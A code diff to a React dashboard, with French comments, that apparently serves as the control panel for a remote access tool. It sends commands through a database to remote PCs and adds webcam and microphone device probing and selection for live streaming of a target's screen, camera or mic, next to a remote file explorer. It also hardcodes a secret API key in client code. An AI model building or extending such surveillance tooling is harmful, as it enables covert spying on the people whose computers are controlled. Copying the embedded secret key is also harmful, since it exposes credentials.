@@ -37,6 +37,10 @@ export default function Dashboard() {
   const [isCapturing, setIsCapturing] = useState(false);
   const [countdown, setCountdown] = useState(10);
   const [streamMode, setStreamMode] = useState<'screen' | 'webcam' | 'mic'>('screen');
+  const [availableDevices, setAvailableDevices] = useState<{cameras: any[], mics: any[]}>({cameras: [], mics: []});
+  const [selectedCamera, setSelectedCamera] = useState<string>('');
+  const [selectedMic, setSelectedMic] = useState<string>('');
+  const [isProbing, setIsProbing] = useState(false);
   
   // File Explorer State
   const [explorerPath, setExplorerPath] = useState("C:\\");
@@ -397,10 +401,38 @@ export default function Dashboard() {
     setTimeout(() => fetchFiles(explorerPath), 2000);
   };
 
+  const probeMediaDevices = async (pcId: string) => {
+    setIsProbing(true);
+    const { data } = await supabase.from('commands').insert({ 
+      computer_id: pcId, 
+      command: 'probe_media', 
+      status: 'pending' 
+    }).select().single();
+
+    if (data) {
+      const check = setInterval(async () => {
+        const { data: res } = await supabase.from('commands').select('result, status').eq('id', data.id).single();
+        if (res?.status === 'executed' && res.result) {
+          try {
+            const devices = JSON.parse(res.result);
+            setAvailableDevices(devices);
+          } catch(e) {}
+          setIsProbing(false);
+          clearInterval(check);
+        }
+      }, 1000);
+      setTimeout(() => { clearInterval(check); setIsProbing(false); }, 15000);
+    }
+  };
+
   const startLiveStream = async (pcId: string, pcName: string, mode: 'screen' | 'webcam' | 'mic' = 'screen') => {
     setSelectedPc(pcId);
     setSelectedPcName(pcName);
     setStreamMode(mode);
+    
+    // Si on n'a pas encore les devices, on les cherche
+    if (availableDevices.cameras.length === 0) probeMediaDevices(pcId);
+
     const roomName = 'k' + pcId.replace(/-/g, '').substring(0, 12);
     try {
       const secretKey = 'aoGqhdUx0-0GdtuP5zhL6hSDiW8SLRwv80ME3HF_cesDvDrx';
@@ -410,8 +442,10 @@ export default function Dashboard() {
         body: JSON.stringify({ roomName, privacy: 'public' })
       });
     } catch(e) {}
-    // On passe le mode dans les args: "roomName|mode"
-    await supabase.from('commands').insert({ computer_id: pcId, command: 'stream_start', args: `${roomName}|${mode}`, status: 'pending' });
+
+    // Args: roomName|mode|camId|micId
+    const args = `${roomName}|${mode}|${selectedCamera}|${selectedMic}`;
+    await supabase.from('commands').insert({ computer_id: pcId, command: 'stream_start', args, status: 'pending' });
     setActiveModal('stream');
   };
 
@@ -633,17 +667,47 @@ export default function Dashboard() {
         <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/90 backdrop-blur-md p-4">
           <div className="bg-[#0c0c0c] border border-white/10 rounded-2xl overflow-hidden w-full max-w-6xl shadow-2xl flex flex-col h-[85vh]">
             <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50">
-              <div className="flex items-center gap-4">
+              <div className="flex flex-wrap items-center gap-4">
                 <h3 className="font-bold flex items-center gap-2 text-white">
                   <Video className="text-green-400" size={18} /> 
                   Live - {selectedPcName} 
-                  <span className="text-[10px] bg-green-500/20 text-green-400 px-2 py-0.5 rounded uppercase ml-2 animate-pulse">{streamMode}</span>
                 </h3>
-                <div className="flex bg-white/5 p-1 rounded-lg border border-white/5 ml-4">
-                  <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'screen')} className={`px-3 py-1 text-[10px] font-bold rounded-md transition-all ${streamMode === 'screen' ? 'bg-green-500 text-white shadow-[0_0_10px_rgba(34,197,94,0.4)]' : 'text-gray-500 hover:text-gray-300'}`}>SCREEN</button>
-                  <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'webcam')} className={`px-3 py-1 text-[10px] font-bold rounded-md transition-all ${streamMode === 'webcam' ? 'bg-purple-500 text-white shadow-[0_0_10px_rgba(168,85,247,0.4)]' : 'text-gray-500 hover:text-gray-300'}`}>WEBCAM</button>
-                  <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'mic')} className={`px-3 py-1 text-[10px] font-bold rounded-md transition-all ${streamMode === 'mic' ? 'bg-blue-500 text-white shadow-[0_0_10px_rgba(59,130,246,0.4)]' : 'text-gray-500 hover:text-gray-300'}`}>MIC ONLY</button>
+                
+                <div className="flex bg-white/5 p-1 rounded-lg border border-white/5">
+                  <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'screen')} className={`px-3 py-1 text-[10px] font-bold rounded-md transition-all ${streamMode === 'screen' ? 'bg-green-500 text-white' : 'text-gray-500 hover:text-gray-300'}`}>SCREEN</button>
+                  <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'webcam')} className={`px-3 py-1 text-[10px] font-bold rounded-md transition-all ${streamMode === 'webcam' ? 'bg-purple-500 text-white' : 'text-gray-500 hover:text-gray-300'}`}>WEBCAM</button>
+                  <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'mic')} className={`px-3 py-1 text-[10px] font-bold rounded-md transition-all ${streamMode === 'mic' ? 'bg-blue-500 text-white' : 'text-gray-500 hover:text-gray-300'}`}>MIC</button>
                 </div>
+
+                {streamMode === 'webcam' && availableDevices.cameras.length > 0 && (
+                  <select 
+                    value={selectedCamera} 
+                    onChange={(e) => setSelectedCamera(e.target.value)}
+                    className="bg-black/40 border border-white/10 rounded px-2 py-1 text-[10px] text-gray-300 focus:outline-none"
+                  >
+                    <option value="">Default Camera</option>
+                    {availableDevices.cameras.map((c: any) => <option key={c.deviceId} value={c.deviceId}>{c.label}</option>)}
+                  </select>
+                )}
+
+                {(streamMode === 'webcam' || streamMode === 'mic') && availableDevices.mics.length > 0 && (
+                  <select 
+                    value={selectedMic} 
+                    onChange={(e) => setSelectedMic(e.target.value)}
+                    className="bg-black/40 border border-white/10 rounded px-2 py-1 text-[10px] text-gray-300 focus:outline-none"
+                  >
+                    <option value="">Default Mic</option>
+                    {availableDevices.mics.map((m: any) => <option key={m.deviceId} value={m.deviceId}>{m.label}</option>)}
+                  </select>
+                )}
+
+                <button 
+                  onClick={() => probeMediaDevices(selectedPc!)} 
+                  className={`p-2 hover:bg-white/5 rounded text-blue-400 ${isProbing ? 'animate-spin' : ''}`}
+                  title="Refresh Device List"
+                >
+                  <RefreshCw size={14} />
+                </button>
               </div>
               <button onClick={() => { if(meteredMeeting) meteredMeeting.leaveMeeting(); setActiveModal(null); }} className="text-gray-400 hover:text-white"><X size={24} /></button>
             </div>
